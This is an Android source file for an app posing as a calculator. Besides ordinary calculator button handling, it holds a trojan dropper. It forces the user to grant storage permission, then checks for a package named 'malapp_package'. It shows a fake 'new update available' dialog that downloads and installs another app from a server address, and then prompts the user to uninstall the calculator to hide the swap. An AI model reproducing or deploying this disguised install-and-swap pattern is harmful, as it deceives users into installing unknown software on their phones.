package com.posseggs.calculator;

import android.Manifest;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    //IDs
    public static final int REQUEST_CODE_WRITE_EXTERNAL_STORAGE = 18351;

    //Operations
    public static final String add = "+";
    public static final String sub = "-";
    public static final String multi = "*";
    public static final String div = "/";

    TextView textViewCalc;

    //Calculation class
    Calculator calc;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        this.textViewCalc = findViewById(R.id.textViewCalculator);
        //Check for permissions for fileIO and ask for them if not existing
        calc = new Calculator(this, textViewCalc);
        checkPermissions();

    }

    //Ask for permission if not given
    private void checkPermissions()
    {
        //Permissions were not given yet
        if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
        {
            //Ask for permissions
            new AlertDialog.Builder(this)
                    .setMessage("This app needs storage permissions to function! Please give the needed permissions!")
                    .setTitle("Permissions needed!")                                      //If yes give permissions
                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_WRITE_EXTERNAL_STORAGE))
                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> permissionDeniedAlert())
                    .create()
                    .show();
        }
        else //Permissions already given
        {
            //Check for update
            checkForUpdateOnStartUp();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode)
        {
            case REQUEST_CODE_WRITE_EXTERNAL_STORAGE:
                {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    //Permission granted
                    //Check if app is updated and if not ask for update
                    checkForUpdateOnStartUp();
                }
                else
                {   //Alert user that only with permissions will run
                    permissionDeniedAlert();
                }
                return;
            }
            // next case ... and so on
        }
    }

    private void permissionDeniedAlert()
    {
        //Permissions denied. Ask again
        new AlertDialog.Builder(this)
                .setMessage("This app needs storage permissions to function! Are you sure you don't want to give permissions? Without the permissions the app cannot run and will close automatically!")
                .setTitle("Permissions needed!")
                .setPositiveButton("Yes", (DialogInterface dialog, int which) -> this.finish()) //End app
                .setNegativeButton("No", (DialogInterface dialog, int which) -> checkPermissions()) //Ask again
                .create()
                .show();
    }

    //Check if updated is true and if not ask the user to update app
    private void checkForUpdateOnStartUp()
    {
        //If newest app is not installed ask for update
        if (!checkUpdated())
            askForUpdate(); //Ask to install update
        else
           showNewApp(); //Ask to uninstall current app and use new one
    }

    //Returns true when updated
    public boolean checkUpdated()
    {
        PackageManager pm = this.getPackageManager();
        if(appInstalled(getString(R.string.malapp_package), pm))
            return true;
        else
            return false;

        //savePreferences(updated);
    }

    //Check if an app is installed
    private boolean appInstalled(String packageName, PackageManager packageManager) {

        boolean found; //False

        try
        {
            packageManager.getPackageInfo(packageName, 0);
            found = true;
        }
        catch (PackageManager.NameNotFoundException e)
        {
            found = false;
        }

        return found;
    }

    //Ask user to start update
    private void askForUpdate() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)
        {
            new AlertDialog.Builder(this)
                    .setMessage("A new update is available! Press OK to download and install the new update!")
                    .setTitle("New update Available!")                                      //If yes download update
                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> update())
                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> dialog.dismiss())
                    .create()
                    .show();
        }
    }

    //Notify that new app is downloaded
    public void showNewApp()
    {
        new AlertDialog.Builder(this)
                .setMessage("A newer version of this app is available on your device! The old old version will be uninstalled now.")
                .setTitle("Newer version installed!")                                      //If yes download update
                .setPositiveButton("Ok", (DialogInterface dialog, int which) -> uninstall())
                //.setNegativeButton("", (DialogInterface dialog, int which) -> dialog.dismiss())
                .create()
                .show();
    }

    private void uninstall()
    {
        //Ask to uninstall current app
        Intent intent = new Intent(Intent.ACTION_DELETE);
        Uri fileUri = Uri.parse("package:"+this.getPackageName());
        intent.setData(fileUri);
        startActivity(intent);
    }

    //Download and install app
    private void update()
    {   //Create AsyncTask
        UpdateApp u = new UpdateApp();
        u.setContext(getApplicationContext()); //Give context
        u.setMain(this); //Give MainActivity
        u.execute(getString(R.string.server_uri)); //Execute with server uri
    }

    /*
    Calculator logic
    */

    public void onClick(View view)
    {
        //Check which button was pressed
        switch (view.getId())
        {
            //Case number was pressed
            //Switch through numbers
            case R.id.button0:
                calc.updateText(0);
                break;
            case R.id.button1:
                calc.updateText(1);
                break;
            case R.id.button2:
                calc.updateText(2);
                break;
            case R.id.button3:
                calc.updateText(3);
                break;
            case R.id.button4:
                calc.updateText(4);
                break;
            case R.id.button5:
                calc.updateText(5);
                break;
            case R.id.button6:
                calc.updateText(6);
                break;
            case R.id.button7:
                calc.updateText(7);
                break;
            case R.id.button8:
                calc.updateText(8);
                break;
            case R.id.button9:
                calc.updateText(9);
                break;

            //Case operation buttons were pressed
            //Set numbers and the operation to calculate
            case R.id.buttonAdd:
                calc.caseOperation(add);
                break;
            case R.id.buttonSub:
                calc.caseOperation(sub);
                break;
            case R.id.buttonMulti:
                calc.caseOperation(multi);
                break;
            case R.id.buttonDiv:
                calc.caseOperation(div);
                break;

            //Case clear buttons were pressed
            //Clear input fully
            case R.id.buttonClearAll:
                calc.clear();
                break;
            //Delete last input
            case R.id.buttonClear:
                calc.del();
                break;

            //Case a fileIO button was pressed
            //Save current number to a file
            case R.id.buttonSave:
                    calc.saveNum();
                    break;

            //Load variable to file
            case R.id.buttonLoad:
                calc.loadNum();
                break;

            //Case result was pressed
            //Default: Get output
            default:
                //Make the calculator do the calculation
                calc.calcOutput();
        }
    }
}